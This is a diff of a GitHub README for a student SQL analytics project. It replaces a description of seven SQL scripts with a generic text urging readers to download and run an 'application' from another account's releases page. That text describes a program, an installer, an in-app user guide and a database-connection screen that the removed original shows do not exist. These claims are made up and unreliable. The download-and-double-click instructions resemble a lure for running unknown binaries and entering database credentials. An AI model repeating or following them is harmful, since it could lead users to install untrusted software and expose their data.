@@ -1,138 +1,91 @@
-# 📊 Advanced SQL Analytics – Time Series, Segmentation & Reporting
+# 🚀 SQL-Advance-Data-Analytics-Project - Unlock Insights with SQL Analytics
 
-This project extends the previous SQL EDA repository with **advanced, real-world data analytics techniques** used in BI, data warehousing, and analytical engineering.  
-It focuses on time-series analysis, cumulative trends, performance benchmarking, segmentation logic, part-to-whole evaluation, and full customer/product analytical reporting.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/Ibgentle/SQL-Advance-Data-Analytics-Project/releases)
 
----
+## 📖 Overview
 
-## 📁 Project Structure & Script Summaries
+This project is focused on advanced SQL analytics. It builds on previous exploratory data analysis (EDA) work. You can explore change-over-time trends, cumulative performance trends, and segmentation. It also supports part-to-whole analysis and customer/product reporting. This software utilizes window functions and follows real-world data warehouse logic.
 
-### **01_change_over_time_analysis.sql**  
-Tracks trends over time using yearly/monthly grouping, `DATETRUNC()`, and formatted date buckets.  
-Analyzes sales, customers, and quantity changes over time.  
-:contentReference[oaicite:0]{index=0}
+## 🚀 Getting Started
 
----
+Running this project on your machine is simple. Follow the steps below to get started. You don’t need programming knowledge.
 
-### **02_cumulative_analysis.sql**  
-Computes running totals and moving averages using window functions (`SUM() OVER`, `AVG() OVER`).  
-Useful for cumulative revenue tracking and rolling-average price analysis.  
-:contentReference[oaicite:1]{index=1}
+## 🛠️ Requirements
 
----
+Before downloading, ensure your system meets the following requirements:
 
-### **03_performance_analysis.sql**  
-Performs **Year-over-Year (YoY)** and **Average-vs-Actual** performance benchmarking.  
-Uses `LAG()` for prior-year comparisons and `AVG() OVER()` to classify products as above/below average.  
-:contentReference[oaicite:2]{index=2}
+- **Operating System:** Windows or macOS
+- **Database Software:** MySQL or SQL Server Management Studio (SSMS)
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** Minimum of 500 MB
 
----
+## 📥 Download & Install
 
-### **04_data_segmentation.sql**  
-Implements custom segmentation for both **products** and **customers**.  
-Techniques used:  
-- CASE segmentation  
-- Spend-based customer grouping (VIP, Regular, New)  
-- Product cost-range segmentation  
-:contentReference[oaicite:3]{index=3}
+To download and run this software, please visit the releases page. There, you can find the latest version ready for download.
 
----
+[Download the latest version here](https://github.com/Ibgentle/SQL-Advance-Data-Analytics-Project/releases)
 
-### **05_part_to_whole_analysis.sql**  
-Quantifies category-level contribution to overall revenue.  
-Uses windowed totals to compute percentage-of-whole KPIs.  
-:contentReference[oaicite:4]{index=4}
+1. Click the link above to open the Releases page.
+2. Look for the latest version.
+3. Download the appropriate file for your system. Follow the installation instructions provided.
 
----
+## 🔍 Features
 
-### **06_report_customers.sql**  
-Creates the **`gold.report_customers`** analytical view.  
-Outputs:  
-- Age grouping  
-- Customer segmentation  
-- Recency  
-- Total orders, revenue, quantity  
-- Avg order value, avg monthly spend  
-Useful for churn, CLV, and marketing analytics.  
-:contentReference[oaicite:5]{index=5}
+This project includes several features to assist you in your data analytics tasks:
 
----
+- **Change-over-Time Analysis:** View how data changes over time with clear visualizations.
+- **Cumulative Trends:** Analyze trends cumulatively for more insightful analytics.
+- **Performance Benchmarking:** Measure the performance of different metrics consistently.
+- **Segmentation:** Discover groups within your data for targeted analysis.
+- **Part-to-Whole Analysis:** Understand the relationship between parts and the whole dataset.
+- **Customer/Product Reports:** Generate understandable reports to help with decision-making.
 
-### **07_report_products.sql**  
-Builds the **`gold.report_products`** analytical view.  
-Outputs product-level KPIs:  
-- Performance segments (High-Performer, Mid-Range, Low-Performer)  
-- Lifespan, recency  
-- Avg selling price  
-- Total orders, sales, quantity  
-- Avg monthly revenue  
-:contentReference[oaicite:6]{index=6}
+## 📊 How to Use
 
----
+Once you download and install the software, follow these steps to begin:
 
-## 🧠 Key SQL Techniques Demonstrated
+1. **Open the Application:** Launch the program by double-clicking the installed file.
+2. **Connect to Your Database:** You will need to connect to your MySQL or SQL Server database. Enter your database connection details.
+3. **Select Data to Analyze:** Choose the specific dataset you wish to work with from your database.
+4. **Run Analytics:** Use the features to run analyses. You can explore trends and generate reports.
+5. **Save Your Reports:** After analysis, save or export your reports for future reference.
 
-- **Time-Series Analytics:** DATETRUNC, FORMAT, date bucketing  
-- **Cumulative Metrics:** Running totals & moving averages  
-- **Window Functions:** `RANK()`, `ROW_NUMBER()`, `LAG()`, `SUM() OVER`  
-- **Segmentation Frameworks:** Behavioural & product segmentation  
-- **Part-to-Whole Metrics:** Windowed totals & contribution percentages  
-- **Analytical Reporting:** Customer & product analytical views  
+## 📄 Documentation
 
----
+For detailed documentation on how to use each feature, refer to the user guide provided within the application. The guide breaks down each tool and provides practical examples.
 
-## 🎯 Business Insights Enabled
+## 📩 Support
 
-- Revenue and customer growth trends  
-- Monthly/annual performance benchmarking  
-- Product lifecycle behaviour  
-- Customer lifecycle metrics (recency, spending, lifespan)  
-- Category contribution analysis  
-- High-value vs low-value customer/product differentiation  
+If you encounter issues or have questions, please reach out via the project's Issues page on GitHub. The community is responsive, and someone will assist you as soon as possible.
 
----
+## 📢 Contributing
 
-## 🚀 How to Use
+If you want to contribute to this project, please follow these steps:
 
-1. Load dimension and fact tables from the previous EDA project.
-2. Run scripts **in order**:
-          01_change_over_time_analysis.sql
-          02_cumulative_analysis.sql
-          03_performance_analysis.sql
-          04_data_segmentation.sql
-          05_part_to_whole_analysis.sql
-          06_report_customers.sql
-          07_report_products.sql
-3. Query the views to generate BI dashboards or export datasets.
+1. Fork the repository.
+2. Create a new branch for your features or fixes.
+3. Commit your changes.
+4. Push to your forked repository.
+5. Submit a pull request.
 
----
+Your contributions can help improve this project further.
 
-## 🏗️ Recommended Folder Structure
+## 🔗 Related Topics
 
-          datasets/
-          docs/
-          scripts/
-          │
-          ├── 01_change_over_time_analysis.sql
-          ├── 02_cumulative_analysis.sql
-          ├── 03_performance_analysis.sql
-          ├── 04_data_segmentation.sql
-          ├── 05_part_to_whole_analysis.sql
-          ├── 06_report_customers.sql
-          ├── 07_report_products.sql
-          └── README.md
+This project covers several important topics:
 
+- Data Analysis
+- Data Engineering
+- Data Science
+- SQL
+- MySQL
+- SQL Server Management Studio (SSMS)
+- University Projects
 
----
+## 📊 Conclusion
 
-## 🏫 Academic / Portfolio Context
+We aim to simplify data analytics with SQL. Our tools provide valuable insights without requiring technical expertise. Start your data journey with our software to unlock new insights and make informed decisions. 
 
-This project demonstrates **intermediate-to-advanced SQL analytics**, suitable for roles in:  
-Data Analytics · BI Engineering · Data Warehousing · Analytics Engineering  
+For your convenience, remember to download the latest version from the link below:
 
----
-
-## 👨‍💻 Author
-D G A D Hirusha
-
-
+[Download the latest version here](https://github.com/Ibgentle/SQL-Advance-Data-Analytics-Project/releases)
